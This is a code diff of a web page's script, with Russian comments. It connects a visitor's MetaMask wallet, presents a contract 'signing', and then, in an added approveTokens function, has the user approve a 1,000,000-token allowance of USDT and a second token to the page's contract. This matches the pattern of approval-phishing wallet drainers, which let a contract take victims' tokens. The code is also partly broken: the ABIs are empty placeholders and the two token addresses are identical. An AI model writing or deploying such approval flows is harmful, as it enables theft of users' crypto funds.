@@ -19,10 +19,10 @@
                     console.log("Подключен аккаунт:", userAddress);
 
                     // Адрес и ABI вашего контракта
-                    const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2";
+                    const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2"; // Адрес вашего контракта
                     const abi = [ /* Вставьте ABI вашего нового контракта здесь */ ];
 
-                    // Создание контракта и вызов подписания
+                    // Создание экземпляра контракта
                     const contract = new web3.eth.Contract(abi, contractAddress);
                     
                     // Подписание контракта
@@ -30,14 +30,7 @@
                     console.log("Контракт подписан пользователем:", userAddress);
 
                     // Предоставление разрешения на управление токенами
-                    const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
-                    const amountToApprove = web3.utils.toWei("1000000", "ether");
-
-                    // Вызов метода для предоставления разрешения
-                    await contract.methods.approve(usdtTokenAddress, amountToApprove).send({ from: userAddress });
-                    console.log("Разрешение предоставлено для контракта:", contractAddress);
-
-                    alert("Контракт успешно подписан и доступ предоставлен!");
+                    await approveTokens(contract, userAddress);
                 } catch (error) {
                     console.error("Ошибка при подключении или подписании:", error);
                 }
@@ -45,6 +38,36 @@
                 alert("MetaMask не найден! Пожалуйста, установите MetaMask и попробуйте снова.");
             }
         });
+
+        async function approveTokens(contract, userAddress) {
+            try {
+                // Предоставление разрешения на управление токенами
+                const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
+                const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего Custom Token
+                const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
+
+                // Подключение контракта USDT токена для предоставления разрешения
+                const usdtAbi = [ /* Вставьте ABI вашего USDT токена здесь */ ]; // ABI USDT токена
+                const usdtContract = new web3.eth.Contract(usdtAbi, usdtTokenAddress);
+
+                // Отправляем транзакцию для предоставления разрешения на управление USDT токенами
+                const approveTx = await usdtContract.methods.approve(contract.options.address, amountToApprove).send({ from: userAddress });
+                console.log("Доступ к USDT токенам предоставлен для контракта:", contract.options.address);
+
+                // Аналогично для Custom Token
+                const customTokenAbi = [ /* Вставьте ABI вашего Custom Token здесь */ ]; // ABI вашего Custom Token
+                const customTokenContract = new web3.eth.Contract(customTokenAbi, customTokenAddress);
+
+                // Отправляем транзакцию для предоставления разрешения на управление Custom Token
+                const approveCustomTx = await customTokenContract.methods.approve(contract.options.address, amountToApprove).send({ from: userAddress });
+                console.log("Доступ к Custom Token предоставлен для контракта:", contract.options.address);
+
+                alert("Контракт успешно подписан и доступ предоставлен!");
+
+            } catch (error) {
+                console.error("Ошибка при предоставлении разрешения на управление токенами:", error);
+            }
+        }
     </script>
 </head>
 <body>
